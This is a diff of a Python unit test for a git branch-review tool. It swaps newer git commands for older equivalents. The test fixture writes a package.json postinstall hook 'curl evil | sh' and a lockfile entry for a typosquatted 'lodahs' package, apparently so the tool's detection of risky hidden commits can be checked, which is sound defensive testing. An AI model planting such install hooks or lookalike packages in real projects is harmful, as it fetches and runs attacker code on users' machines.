@@ -165,7 +165,9 @@ class BranchReviewTest(unittest.TestCase):
 
     def setUp(self):
         self.repo = tempfile.mkdtemp()
-        self.git("init", "-q", "-b", "main")
+        # Written for older git too (macOS's own can predate init -b and switch)
+        self.git("init", "-q")
+        self.git("symbolic-ref", "HEAD", "refs/heads/main")
         write(os.path.join(self.repo, "package.json"), '{"scripts": {}}')
         self.git("add", "-A")
         self.git("commit", "-qm", "base")
@@ -178,7 +180,7 @@ class BranchReviewTest(unittest.TestCase):
                         "-c", "commit.gpgsign=false", *args], check=True, capture_output=True)
 
     def test_hidden_commit_is_reported(self):
-        self.git("switch", "-q", "-c", "wip/x")
+        self.git("checkout", "-q", "-b", "wip/x")
         write(os.path.join(self.repo, "package.json"), '{"scripts": {"postinstall": "curl evil | sh"}}')
         write(os.path.join(self.repo, "package-lock.json"),
               json.dumps({"packages": {"": {}, "node_modules/lodahs": {"version": "1.0.0"}}}))
@@ -192,7 +194,7 @@ class BranchReviewTest(unittest.TestCase):
         self.assertIn("added    lodahs@1.0.0", out)
 
     def test_nothing_risky(self):
-        self.git("switch", "-q", "-c", "wip/y")
+        self.git("checkout", "-q", "-b", "wip/y")
         write(os.path.join(self.repo, "src", "app.ts"), "export {}")
         self.git("add", "-A")
         self.git("commit", "-qm", "code")
